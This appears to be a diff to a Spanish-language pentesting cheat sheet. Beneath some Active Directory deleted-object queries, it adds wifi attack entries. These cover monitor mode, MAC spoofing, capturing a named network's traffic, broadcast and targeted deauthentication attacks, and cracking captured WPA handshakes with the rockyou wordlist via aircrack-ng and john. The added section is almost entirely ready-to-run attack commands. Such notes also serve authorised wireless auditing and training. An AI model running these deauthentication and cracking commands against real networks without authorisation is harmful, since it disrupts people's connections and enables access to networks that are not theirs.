@@ -1449,6 +1449,65 @@ Descripcion: Obtener infomracion de usuarios borrados
 Comando: get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects
 Comando2: get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *
 NOTA: Es necesario estar en el grupo AD Recycle Bin
-perritooooooooooo
-gato
-aaaaaaa
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "wifi"
+Protocolo: "wifi"
+Herramienta: "ifconfig"
+Descripcion: Colocar la tarjeta en modo monitor
+Comando: ifconfig wlan0 down
+Comando: airmon-ng check kill
+Comando: iwconfig wlan0 mode monitor
+Comando: ifconfig wlan0 up
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "wifi"
+Protocolo: "wifi"
+Herramienta: "macchanger"
+Descripcion: Cambiar la direccion MAC de la tarjeta de red
+Comando: macchanger --mac=00:20:91:a1:da:12 wlan0
+NOTA: Si no deja es porque actualmente está dada de alta, la tenemos que dar de baja con ifconfig wlan0 down, cambiar la mac y volver a darla de alta
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "wifi"
+Protocolo: "wifi"
+Herramienta: "airodump"
+Descripcion: Capturando paquetes
+Comando:  airodump-ng wlan0
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "wifi"
+Protocolo: "wifi"
+Herramienta: "airodump"
+Descripcion: Capturando paquetes de un SSID en especifico
+Comando: airodump-ng --bssid 28:F5:D1:48:1D:2C -c 1 --essid IZZI-5E43 wlan0 -w casa
+NOTA: Colocar el BSSID para que cuando realice el ataque de deautenticacion no falle
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "wifi"
+Protocolo: "wifi"
+Herramienta: "aireplay"
+Descripcion: Ataque de Desautenticacion global
+Comando: aireplay-ng -0 0 -a 28:F5:D1:48:1D:2C -c FF:FF:FF:FF:FF:FF wlan0
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "wifi"
+Protocolo: "wifi"
+Herramienta: "aireplay"
+Descripcion: Ataque de Desautenticacion dirigido
+Comando: aireplay-ng -0 10 -e "POCO X3 Pro" -c 84:2E:27:40:B7:D2 wlan0
+NOTA: La opcion c es para especificar la MAC del cliente que se quiere deautenticar
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "wifi"
+Protocolo: "wifi"
+Herramienta: "aircrack"
+Descripcion: Romper handshake para identificar la contrasena del SSI
+Comando: aircrack-ng -w /usr/share/wordlists/rockyou.txt captura-01.cap
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "wifi"
+Protocolo: "wifi"
+Herramienta: "aircrack"
+Descripcion: "Extrayendo hash de una captura"
+Comando: aircrack-ng -J miCaptura captura-01.cap
+Comando: hccap2john miCaptura.hccap > miHash
+Comando:  john --wordlist=/usr/share/wordlists/rockyou.txt miHash
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "wifi"
+Protocolo: "wifi"
+Herramienta: "wifite"
+Descripcion: "Herramienta automatizada para auditorias wifi"
+Comando: wifite
